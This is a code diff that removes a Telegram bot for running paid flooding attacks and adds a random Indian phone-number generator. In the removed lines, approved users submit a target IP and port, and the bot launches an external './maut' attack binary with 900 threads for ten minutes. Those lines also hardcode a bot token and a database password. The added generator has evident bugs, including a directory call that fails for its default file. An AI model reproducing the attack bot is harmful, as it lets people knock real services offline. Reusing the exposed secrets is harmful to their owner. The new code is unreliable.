@@ -1,185 +1,139 @@
-import telebot
-import logging
-import subprocess
-from pymongo import MongoClient
-from datetime import datetime, timedelta
-import certifi
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+import random
+from collections import OrderedDict
+import time
+import os
 
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-TOKEN = '7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0'
-MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
-CHANNEL_ID = -1002512368825
-ADMIN_IDS = [8167507955]
-
-client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['soul']
-users_collection = db.users
-bot = telebot.TeleBot(TOKEN)
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-user_attack_details = {}
-active_attacks = {}
-
-def run_attack_command_sync(user_id, target_ip, target_port, action):
-    try:
-        if action == 1:  # Start attack
-            # Using fixed 600 seconds (10 minutes) and 900 threads as per your requirement
-            process = subprocess.Popen(["./maut", target_ip, str(target_port), "600", "900"], 
-                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            active_attacks[(user_id, target_ip, target_port)] = process.pid
-            logging.info(f"Attack started on {target_ip}:{target_port} with PID {process.pid}")
-        elif action == 2:  # Stop attack
-            pid = active_attacks.pop((user_id, target_ip, target_port), None)
-            if pid:
-                subprocess.run(["kill", str(pid)], check=True)
-                logging.info(f"Stopped attack with PID {pid}")
-    except Exception as e:
-        logging.error(f"Error in run_attack_command_sync: {e}")
-
-def is_user_admin(user_id, chat_id):
-    try:
-        chat_member = bot.get_chat_member(chat_id, user_id)
-        return chat_member.status in ['administrator', 'creator'] or user_id in ADMIN_IDS
-    except Exception as e:
-        logging.error(f"Error checking admin status: {e}")
-        return False
-
-def check_user_approval(user_id):
-    try:
-        user_data = users_collection.find_one({"user_id": user_id})
-        if user_data and user_data['plan'] > 0:
-            valid_until = user_data.get('valid_until', "")
-            return valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date()
-        return False
-    except Exception as e:
-        logging.error(f"Error in checking user approval: {e}")
-        return False
-
-def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')
-
-def send_main_buttons(chat_id):
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-    markup.add(KeyboardButton("ATTACK"), KeyboardButton("Start Attack 🚀"), KeyboardButton("Stop Attack"))
-    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')
-
-@bot.message_handler(commands=['approve'])
-def approve_user(message):
-    if not is_user_admin(message.from_user.id, message.chat.id):
-        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
-        return
-
-    try:
-        cmd_parts = message.text.split()
-        if len(cmd_parts) != 4:
-            bot.send_message(message.chat.id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
+class MobileNumberGenerator:
+    def __init__(self):
+        self.generated_numbers = OrderedDict()
+        self.default_filename = "mobile_numbers.txt"
+    
+    def generate_number(self, pattern):
+        """
+        Generate a mobile number based on the pattern
+        Pattern example: "+91976^^^^^^" where ^ represents a random digit
+        """
+        number = []
+        for char in pattern:
+            if char == '^':
+                number.append(str(random.randint(0, 9)))
+            else:
+                number.append(char)
+        return ''.join(number)
+    
+    def generate_unique_numbers(self, pattern, count, filename=None):
+        """
+        Generate unique mobile numbers and save to file
+        """
+        if filename is None:
+            filename = self.default_filename
+        
+        if '^' not in pattern:
+            print("Pattern must contain '^' symbols for random digits")
             return
+        
+        # Calculate total possible unique numbers for this pattern
+        digits_needed = pattern.count('^')
+        total_possible = 10 ** digits_needed
+        
+        if count > total_possible:
+            print(f"Warning: Only {total_possible} unique combinations possible for this pattern")
+            count = total_possible
+        
+        start_time = time.time()
+        generated = 0
+        
+        # Create directory if it doesn't exist
+        os.makedirs(os.path.dirname(filename), exist_ok=True)
+        
+        with open(filename, 'a') as file:  # Append mode to avoid overwriting
+            while generated < count:
+                num = self.generate_number(pattern)
+                if num not in self.generated_numbers:
+                    self.generated_numbers[num] = True
+                    file.write(num + '\n')
+                    generated += 1
+                    
+                    # Progress reporting
+                    if generated % 1000 == 0:
+                        print(f"Generated {generated}/{count} numbers for pattern {pattern}...")
+        
+        end_time = time.time()
+        print(f"\nSuccessfully generated {generated} unique numbers for pattern {pattern}")
+        print(f"Time taken: {end_time-start_time:.2f} seconds")
+        print(f"Saved to {filename}\n")
 
-        target_user_id = int(cmd_parts[1])
-        plan = int(cmd_parts[2])
-        days = int(cmd_parts[3])
+def display_banner():
+    print("\n" + "="*50)
+    print("MOBILE NUMBER GENERATOR BOT".center(50))
+    print("="*50)
+    print("\nCommands:")
+    print("/gen +91976^^^^^^ 1000 - Generate 1000 numbers starting with +91976")
+    print("/gen +91754^^^^^^ 500  - Generate 500 numbers starting with +91754")
+    print("/list                 - Show all generated patterns and counts")
+    print("/clear                - Clear all generated numbers from memory")
+    print("/exit                 - Exit the program")
+    print("\nNote: Each '^' in pattern will be replaced with random digit")
+    print("Example: +91976^^^^^^ creates 10-digit numbers (+91976 + 5 random digits)\n")
 
-        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else ""
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
-            upsert=True
-        )
-        bot.send_message(message.chat.id, f"*User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
-    except Exception as e:
-        bot.send_message(message.chat.id, "*Error processing approval*", parse_mode='Markdown')
-        logging.error(f"Error in approving user: {e}")
-
-@bot.message_handler(commands=['disapprove'])
-def disapprove_user(message):
-    if not is_user_admin(message.from_user.id, message.chat.id):
-        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
-        return
-
-    try:
-        cmd_parts = message.text.split()
-        if len(cmd_parts) != 2:
-            bot.send_message(message.chat.id, "*Invalid command format. Use /disapprove <user_id>*", parse_mode='Markdown')
-            return
-
-        target_user_id = int(cmd_parts[1])
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
-            upsert=True
-        )
-        bot.send_message(message.chat.id, f"*User {target_user_id} disapproved and reverted to free.*", parse_mode='Markdown')
-    except Exception as e:
-        bot.send_message(message.chat.id, "*Error processing disapproval*", parse_mode='Markdown')
-        logging.error(f"Error in disapproving user: {e}")
-
-@bot.message_handler(func=lambda message: message.text == "ATTACK")
-def attack_button_handler(message):
-    if not check_user_approval(message.from_user.id):
-        send_not_approved_message(message.chat.id)
-        return
-
-    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_attack_ip_port)
-
-@bot.message_handler(commands=['attack'])
-def attack_command(message):
-    if not check_user_approval(message.from_user.id):
-        send_not_approved_message(message.chat.id)
-        return
-
-    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_attack_ip_port)
-
-def process_attack_ip_port(message):
-    try:
-        args = message.text.split()
-        if len(args) != 2:
-            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
-            return
-
-        target_ip, target_port = args[0], int(args[1])
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
-            return
-
-        user_attack_details[message.from_user.id] = (target_ip, target_port)
-        send_main_buttons(message.chat.id)
-    except Exception as e:
-        logging.error(f"Error in processing attack IP and port: {e}")
-        bot.send_message(message.chat.id, "*Something went wrong. Please try again.*", parse_mode='Markdown')
-
-@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
-def start_attack(message):
-    if not check_user_approval(message.from_user.id):
-        send_not_approved_message(message.chat.id)
-        return
-
-    attack_details = user_attack_details.get(message.from_user.id)
-    if attack_details:
-        target_ip, target_port = attack_details
-        run_attack_command_sync(message.from_user.id, target_ip, target_port, 1)
-        bot.send_message(message.chat.id, f"*Attack started on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
-        bot.send_message(message.chat.id, "*Attack will run for 10 minutes with 900 threads*", parse_mode='Markdown')
-    else:
-        bot.send_message(message.chat.id, "*No target specified. Use /attack to set it up.*", parse_mode='Markdown')
-
-@bot.message_handler(func=lambda message: message.text == "Stop Attack")
-def stop_attack(message):
-    attack_details = user_attack_details.get(message.from_user.id)
-    if attack_details:
-        target_ip, target_port = attack_details
-        run_attack_command_sync(message.from_user.id, target_ip, target_port, 2)
-        bot.send_message(message.chat.id, f"*Attack stopped on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
-        user_attack_details.pop(message.from_user.id, None)
-    else:
-        bot.send_message(message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')
-
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    send_main_buttons(message.chat.id)
+def main():
+    generator = MobileNumberGenerator()
+    display_banner()
+    
+    while True:
+        user_input = input("\nEnter command: ").strip()
+        
+        if user_input.lower() == 'exit':
+            print("Exiting Mobile Number Generator Bot...")
+            break
+        
+        elif user_input.lower() == '/list':
+            print("\nGenerated Numbers Summary:")
+            if not generator.generated_numbers:
+                print("No numbers generated yet")
+            else:
+                patterns = {}
+                for num in generator.generated_numbers:
+                    prefix = num[:7]  # Get the base pattern (+91976 or +91754 etc.)
+                    patterns[prefix] = patterns.get(prefix, 0) + 1
+                
+                for pattern, count in patterns.items():
+                    print(f"{pattern}******: {count} numbers")
+            continue
+        
+        elif user_input.lower() == '/clear':
+            generator.generated_numbers.clear()
+            print("All generated numbers cleared from memory (file remains unchanged)")
+            continue
+        
+        elif user_input.startswith('/gen'):
+            try:
+                parts = user_input.split()
+                if len(parts) != 3:
+                    raise ValueError
+                
+                pattern = parts[1]
+                count = int(parts[2])
+                
+                if count <= 0:
+                    print("Count must be positive")
+                    continue
+                
+                # Validate pattern
+                if not pattern.startswith('+') or '^' not in pattern:
+                    print("Invalid pattern. Must start with '+' and contain '^' for random digits")
+                    continue
+                
+                # For 10-digit Indian numbers (including +91)
+                if len(pattern.replace('^', '0')) != 12 or pattern.count('^') != 10 - (len(pattern) - pattern.count('^') - 3):
+                    print("Note: Pattern should result in 10-digit Indian numbers (+91 followed by 10 digits)")
+                
+                generator.generate_unique_numbers(pattern, count)
+                
+            except (IndexError, ValueError):
+                print("Invalid command format. Use: /gen +91976^^^^^^ 1000")
+        else:
+            print("Unknown command. Type '/help' for available commands")
 
 if __name__ == "__main__":
-    logging.info("Starting bot...")
-    bot.polling(none_stop=True)
+    main()
